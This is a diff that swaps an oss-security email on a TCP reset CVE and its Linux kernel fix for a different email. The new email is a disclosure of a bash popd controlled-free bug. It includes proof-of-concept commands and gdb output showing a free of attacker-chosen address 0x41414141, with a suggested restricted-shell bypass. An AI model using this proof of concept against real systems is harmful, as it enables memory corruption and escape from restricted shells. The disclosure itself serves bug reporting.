@@ -1,51 +1,56 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/03/11
-Message-ID: <20160303130737.GN22595@suse.de>
-Date: Thu, 3 Mar 2016 14:07:37 +0100
-From: Marcus Meissner <meissner@...e.de>
-To: OSS Security List <oss-security@...ts.openwall.com>, cve-assign@...re.org
-Subject: CVE-2004-0230 additions and Linux Kernel fix
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/17/5
+Message-ID: <CAEr-gPFsVAB+5KrxRigmb=TkuSPxdGAW-GZ6cdQemxmJf2CFUA@mail.gmail.com>
+Date: Thu, 17 Nov 2016 12:04:49 -0500
+From: Fernando Muñoz <fernando@...l-life.com>
+To: oss-security@...ts.openwall.com
+Cc: Chester Ramey <chet.ramey@...e.edu>
+Subject: bash - popd controlled free
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+bash - popd controlled free
+====================
 
-CVE-2004-0230 is an old standing TCP protocol issue complained about by shitty network vulnerability scanners (I am looking at you Nessus).
+popd can be tricked to free a user supplied address in the following way:
 
-There has been however some progress since 2004...
+$ popd +-111111
 
-It has new references to add:
+This could be used to bypass restricted shells (rsh) on some
+environments to cause use-after-free.
 
-RFC 5961 was written to address this CVE: https://tools.ietf.org/html/rfc5961
+This was already reported to bash devs and only considered a bug, if
+Mitre consider it could have a security impact, please assign a CVE.
 
-And the Linux Kernel has implemented this in
+Details
+======
+$ gdb bash
+...
+(gdb) r -c 'popd +-67372036'
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/bashinstrumentado/bash-4.3/bash -c 'popd +-67372036'
 
-http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=282f23c6ee343126156dd41218b22ece96d747e3
+Program received signal SIGSEGV, Segmentation fault.
+0x0827f93a in popd_builtin (list=<optimized out>) at ./pushd.def:384
+384          free (pushd_directory_list[i]);
+(gdb) print pushd_directory_list[i]
+Cannot access memory at address 0x10101010
 
-commit 282f23c6ee343126156dd41218b22ece96d747e3
-Author: Eric Dumazet <edumazet@...gle.com>
-Date:   Tue Jul 17 10:13:05 2012 +0200
+----
+$ export AA=`perl -e 'print "A"x100000'`
+$ gdb ./bash
+...
+(gdb) x/s *((char **)environ+13)
+0xbffe75d4:    "AA=", 'A' <repeats 197 times>...
+(gdb) run -c 'popd +-805281142'
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/bash/bash-4.3/bash -c 'popd +-805281142'
 
-    tcp: implement RFC 5961 3.2
-    
-    Implement the RFC 5691 mitigation against Blind
-    Reset attack using RST bit.
-    
-    Idea is to validate incoming RST sequence,
-    to match RCV.NXT value, instead of previouly accepted
-    window : (RCV.NXT <= SEG.SEQ < RCV.NXT+RCV.WND)
-    
-    If sequence is in window but not an exact match, send
-    a "challenge ACK", so that the other part can resend an
-    RST with the appropriate sequence.
-    
-    Add a new sysctl, tcp_challenge_ack_limit, to limit
-    number of challenge ACK sent per second.
-    
-    Add a new SNMP counter to count number of challenge acks sent.
-    (netstat -s | grep TCPChallengeACK)
-    
-    Signed-off-by: Eric Dumazet <edumazet@...gle.com>
-    Cc: Kiran Kumar Kella <kkiran@...adcom.com>
-    Signed-off-by: David S. Miller <davem@...emloft.net>
+Program received signal SIGSEGV, Segmentation fault.
+internal_free (mem=0x41414141, file=0x83fb36c "./pushd.def", line=384,
+flags=<optimized out>) at malloc.c:863
+863      if (p->mh_alloc == ISMEMALIGN)
 
-Ciao, Marcus
+
+- Fernando
